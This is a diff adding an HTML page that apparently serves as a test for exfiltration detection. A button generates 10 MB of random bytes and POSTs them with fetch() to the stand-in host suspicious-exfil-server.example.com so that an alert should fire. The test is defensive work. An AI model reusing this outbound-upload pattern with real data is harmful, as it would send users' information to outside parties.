@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>Exfiltration Detection Test</title></head>
+<body>
+<h1>Data Exfiltration Test</h1>
+<p>This page attempts to upload large data to simulate exfiltration.</p>
+<button onclick="simulateExfiltration()">Start Exfiltration Test</button>
+<div id="status"></div>
+<script>
+function simulateExfiltration() {
+    // Generate 10MB of data
+    const dataSize = 10 * 1024 * 1024;
+    const data = new Uint8Array(dataSize);
+    for (let i = 0; i < dataSize; i++) {
+        data[i] = Math.floor(Math.random() * 256);
+    }
+
+    document.getElementById('status').textContent =
+        'Uploading ' + (dataSize / 1024 / 1024).toFixed(2) + ' MB...';
+
+    fetch('https://suspicious-exfil-server.example.com/upload', {
+        method: 'POST',
+        body: data
+    })
+    .then(() => {
+        document.getElementById('status').textContent = 'Upload complete (or failed as expected)';
+    })
+    .catch(err => {
+        document.getElementById('status').textContent = 'Upload failed (expected): ' + err.message;
+    });
+}
+</script>
+<p>Click button to trigger large upload. Check for exfiltration alert.</p>
+</body>
+</html>
